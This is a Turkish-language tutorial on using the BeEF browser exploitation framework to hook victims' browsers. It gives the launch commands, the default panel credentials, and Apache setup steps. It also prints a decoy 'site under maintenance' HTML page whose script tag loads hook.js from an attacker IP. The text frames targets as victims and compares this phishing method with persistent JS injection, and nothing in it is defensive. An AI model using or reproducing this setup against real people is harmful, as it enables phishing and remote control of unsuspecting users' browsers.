#### **🎯 Temel Çalışma Mantığı**
- **Hedef:** Kurbanın tarayıcısında JavaScript kodu çalıştırarak kontrol sağlamak
- **Çalışma:** Terminalden başlatıldığında yerel ağda web arayüzü (http://[saldırgan-ip]:3000) açar
- **Yetki:** `sudo ./beef` komutu ile root yetkisinde çalıştırılmalıdır ⚡

---
### **🎯 Beef Framework Temel Kullanım**

#### **🔧 Beef'i Başlatma**
```bash
# 1. Beef klasörüne git (genellikle /opt klasörüne kurulması önerilir)
cd /opt/beef

# 2. Beef'i başlat
./beef
```

#### **🌐 Beef Arayüzüne Erişim**
- Beef başlatıldığında terminalde **UI URL** görüntülenecek
- Tarayıcıdan bu adrese gidilir: `http://[saldırgan-ip]:3000/ui/panel`
- Varsayılan giriş bilgileri: **beef** / **beef**
---
### **🎣 TEMEL OLTA LAMA YÖNTEMİ**

#### **📡 Web Sunucusu Hazırlığı**
```bash
# 1. Apache web sunucusunu başlat
sudo service apache2 start

# 2. Web dizinine git
cd /var/www/html
```

#### **📄 index.html Dosyasını Düzenleme**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Güvenli Site</title>
</head>
<body>
    <h1>Site Bakımda</h1>
    <p>Lütfen bekleyin...</p>
    
    <!-- 🔻 SALDIRGAN IP'SİNİ BURAYA YAZ -->
    <script src="http://10.0.2.8:3000/hook.js"></script>
</body>
</html>
```

#### **🌐 Kurbanı Oltalama**
- Kurban, tarayıcısından saldırganın IP adresine gider: `http://[saldırgan-ip]`
- **Beef hook'u yüklenir** ve kurban "Hooked Browsers" listesine düşer ✅
- 🎯 **Hedef başarıyla oltalanmıştır!**

---

### **⚠️ BU YÖNTEMİN SINIRLILIKLARI**

| Durum | Erişim | Açıklama |
|-------|--------|----------|
| **✅ Site Açık** | **Aktif** | Kurban sitedeyken kontrol devam eder |
| **❌ Site Kapalı** | **Kaybolur** | Kurban siteyi kapattığında erişim biter |
| **🔄 Yeni Sekme** | **Yeniden Başlar** | Kurban yeni sekmede siteye girerse erişim yeniden sağlanır |

---

### **🆚 DİĞER YÖNTEMLERLE KARŞILAŞTIRMA**

| Yöntem | Kalıcılık | Kapsam | Zorluk |
|--------|-----------|--------|--------|
| **🌐 Basit Oltalama** | ❌ Geçici | Tek sayfa | 🟢 Kolay |
| **🚀 JS Enjeksiyonu** | ✅ **Kalıcı** | Tüm siteler | 🟡 Orta |

---